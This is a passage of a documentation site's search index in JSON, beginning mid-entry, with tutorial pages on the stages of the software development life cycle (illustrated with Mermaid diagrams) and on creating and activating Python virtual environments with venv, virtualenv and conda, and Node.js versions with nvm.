fill:#f9f,stroke:#333</code></pre>"},{"location":"software-engineering/sdlc/sdlc/","title":"Software Development Life Cycle (SDLC)","text":""},{"location":"software-engineering/sdlc/sdlc/#what-is-sdlc","title":"What is SDLC?","text":"<p>The Software Development Life Cycle (SDLC) is a systematic process for building software applications that ensures their quality and correctness. The SDLC process aims to produce high-quality software that meets customer expectations and completes development within time and cost estimates.</p> <pre><code>graph TD\n    A[Planning] --&gt;|Requirements Gathered| B[Analysis]\n    B --&gt;|Requirements Defined| C[Design]\n    C --&gt;|Architecture Created| D[Implementation]\n    D --&gt;|Code Developed| E[Testing]\n    E --&gt;|Software Verified| F[Deployment]\n    F --&gt;|Live Release| G[Maintenance]\n    G --&gt;|Updates Required| A</code></pre>"},{"location":"software-engineering/sdlc/sdlc/#key-objectives","title":"Key Objectives","text":"<ul> <li>Deliver high-quality software</li> <li>Meet customer expectations</li> <li>Complete within timeline and budget</li> <li>Follow best practices and standards</li> </ul>"},{"location":"software-engineering/sdlc/sdlc/#sdlc-stages","title":"SDLC Stages","text":""},{"location":"software-engineering/sdlc/sdlc/#1-planning-and-requirement-analysis","title":"1. Planning and Requirement Analysis","text":"<pre><code>flowchart TD\n    A[Gather Requirements] --&gt; B[Analyze Requirements]\n    B --&gt; C[Document Requirements]\n    C --&gt; D[Validate Requirements]\n    D --&gt; E[Create Project Plan]</code></pre>"},{"location":"software-engineering/sdlc/sdlc/#2-defining-requirements","title":"2. Defining Requirements","text":"<pre><code>flowchart LR\n    A[Business Requirements] --&gt; B[Technical Requirements]\n    B --&gt; C[Functional Requirements]\n    C --&gt; D[Non-Functional Requirements]\n    D --&gt; E[SRS Document]</code></pre> <ul> <li>This is fulfilled by utilizing SRS (Software Requirement Specification). This is a sort of document that specifies all those things that need to be defined and created during the entire project cycle.</li> </ul>"},{"location":"software-engineering/sdlc/sdlc/#3-system-design","title":"3. System Design","text":""},{"location":"software-engineering/sdlc/sdlc/#two-approaches-to-system-design","title":"Two approaches to System Design:","text":"<ol> <li> <p>Top-Down Approach (High Level \u2192 Low Level)</p> </li> <li> <p>Start with overall system architecture</p> </li> <li>Break down into smaller components</li> <li> <p>Good for understanding big picture first</p> </li> <li> <p>Bottom-Up Approach (Low Level \u2192 High Level)</p> </li> <li>Start with detailed components</li> <li>Combine into larger systems</li> <li>Good for understanding implementation details first</li> </ol>"},{"location":"software-engineering/sdlc/sdlc/#design-hierarchy","title":"Design Hierarchy:","text":"<pre><code>graph TD\n   A[Requirements Analysis] --&gt; B[Low Level Design]\n        B --&gt; C[High Level Design]\n        C --&gt; D[System Architecture]</code></pre> <pre><code>graph TD\n    subgraph \"System Design\"\n\n        subgraph \"Low Level Design\"\n            B1[Class Design]\n            B2[Algorithm Details]\n            B3[Data Structures]\n        end\n\n        subgraph \"High Level Design\"\n            C1[Component Design]\n            C2[Interface Design]\n            C3[Database Design]\n        end\n\n        subgraph \"System Architecture\"\n            D1[Overall Structure]\n            D2[System Integration]\n            D3[Deployment Plan]\n        end\n    end</code></pre> <ul> <li>SRS is a reference for software designers to come up with the best architecture for the software. Hence, with the requirements defined in SRS, multiple designs for the product architecture are present in the Design Document Specification (DDS).</li> </ul>"},{"location":"software-engineering/sdlc/sdlc/#4-implementation","title":"4. Implementation","text":"<ul> <li>At this stage, the fundamental development of the product starts. For this, developers use a specific programming code as per the design in the DDS.</li> <li>Programming tools like compilers, interpreters, debuggers, etc. and languages like C/C++, Python, Java etc. are also put into use at this stage.</li> </ul> <pre><code>flowchart LR\n    A[Code Development] --&gt; B[Code Review]\n    B --&gt; C[Unit Testing]\n    C --&gt; D[Integration]</code></pre>"},{"location":"software-engineering/sdlc/sdlc/#5-testing-and-integration","title":"5. Testing and Integration","text":"<pre><code>flowchart TD\n    A[Unit Testing] --&gt; B[Integration Testing]\n    B --&gt; C[System Testing]\n    C --&gt; D[Acceptance Testing]\n    D --&gt; E[Performance Testing]</code></pre>"},{"location":"software-engineering/sdlc/sdlc/#6-deployment","title":"6. Deployment","text":"<pre><code>flowchart LR\n    A[Build Release] --&gt; B[Deploy to Staging]\n    B --&gt; C[User Acceptance]\n    C --&gt; D[Production Deployment]</code></pre>"},{"location":"software-engineering/sdlc/sdlc/#7-maintenance","title":"7. Maintenance","text":"<pre><code>flowchart TD\n    A[Monitor System] --&gt; B[Bug Fixes]\n    B --&gt; C[Updates]\n    C --&gt; D[Enhancements]\n    D --&gt; A</code></pre> <p>Reference: Click here</p>"},{"location":"virtual-environment/information/virtual-env-info/","title":"Virtual Environments","text":"<p>Virtual environments are isolated environments that allow you to manage dependencies for different projects separately. They are particularly useful in Python development, where different projects may require different versions of libraries.</p>"},{"location":"virtual-environment/information/virtual-env-info/#purpose-of-virtual-environments","title":"Purpose of Virtual Environments","text":"<ol> <li>Dependency Management: Virtual environments help manage project-specific dependencies without affecting the global Python installation.</li> <li>Version Control: You can maintain different versions of libraries for different projects, ensuring compatibility and stability.</li> <li>Isolation: Each virtual environment is self-contained, preventing conflicts between packages used in different projects.</li> </ol>"},{"location":"virtual-environment/information/virtual-env-info/#common-tools-for-creating-virtual-environments","title":"Common Tools for Creating Virtual Environments","text":"<ul> <li>venv: A built-in module in Python 3 that allows you to create lightweight virtual environments.</li> <li>virtualenv: A third-party tool that provides more features and supports older versions of Python.</li> <li>conda: A package manager that can create virtual environments and manage packages for Python and other languages.</li> </ul>"},{"location":"virtual-environment/information/virtual-env-info/#basic-commands","title":"Basic Commands","text":""},{"location":"virtual-environment/information/virtual-env-info/#using-venv","title":"Using <code>venv</code>","text":"<ol> <li> <p>Create a Virtual Environment:    <pre><code>python -m venv myenv\n</code></pre></p> </li> <li> <p>Activate the Virtual Environment:</p> </li> <li>On Windows:      <pre><code>myenv\\Scripts\\activate\n</code></pre></li> <li> <p>On macOS/Linux:      <pre><code>source myenv/bin/activate\n</code></pre></p> </li> <li> <p>Deactivate the Virtual Environment:    <pre><code>deactivate\n</code></pre></p> </li> </ol>"},{"location":"virtual-environment/information/virtual-env-info/#using-virtualenv","title":"Using <code>virtualenv</code>","text":"<ol> <li> <p>Install virtualenv (if not already installed):    <pre><code>pip install virtualenv\n</code></pre></p> </li> <li> <p>Create a Virtual Environment:    <pre><code>virtualenv myenv\n</code></pre></p> </li> <li> <p>Activate and Deactivate: Same as above.</p> </li> </ol>"},{"location":"virtual-environment/information/virtual-env-info/#using-conda","title":"Using <code>conda</code>","text":"<ol> <li> <p>Create a Virtual Environment:    <pre><code>conda create --name myenv\n</code></pre></p> </li> <li> <p>Activate the Virtual Environment:    <pre><code>conda activate myenv\n</code></pre></p> </li> <li> <p>Deactivate the Virtual Environment:    <pre><code>conda deactivate\n</code></pre></p> </li> </ol>"},{"location":"virtual-environment/information/virtual-env-info/#conclusion","title":"Conclusion","text":"<p>Using virtual environments is a best practice in software development, especially for Python projects. They help maintain clean and manageable project dependencies, making it easier to work on multiple projects simultaneously.</p>"},{"location":"virtual-environment/snippets/create-virtual-env/","title":"Creating a Virtual Environment","text":""},{"location":"virtual-environment/snippets/create-virtual-env/#python","title":"Python","text":"<p>To create a virtual environment in Python, follow these steps:</p> <ol> <li> <p>Install <code>virtualenv</code> (if not already installed): <code>pip install virtualenv</code></p> </li> <li> <p>Navigate to your project directory: <code>cd your-project-directory</code></p> </li> <li> <p>Create a virtual environment: <code>virtualenv venv</code></p> </li> <li> <p>Activate the virtual environment:</p> </li> <li> <p>On Windows:      <pre><code>venv\\Scripts\\activate\n</code></pre></p> </li> <li> <p>On macOS/Linux:      <pre><code>source venv/bin/activate\n</code></pre></p> </li> <li> <p>Deactivate the virtual environment when done:    <pre><code>deactivate\n</code></pre></p> </li> </ol>"},{"location":"virtual-environment/snippets/create-virtual-env/#nodejs","title":"Node.js","text":"<p>To create a virtual environment in Node.js, you can use <code>nvm</code> (Node Version Manager):</p> <ol> <li> <p>Install <code>nvm</code> (if not already installed):    Follow the installation instructions from the nvm repository.</p> </li> <li> <p>Install a specific Node.js version: <code>nvm install &lt;version&gt;</code></p> </li> <li> <p>Use the installed version: <code>nvm use &lt;version&gt;</code></p> </li> <li> <p>Deactivate the version: <code>nvm deactivate</code></p> </li> </ol>"}]}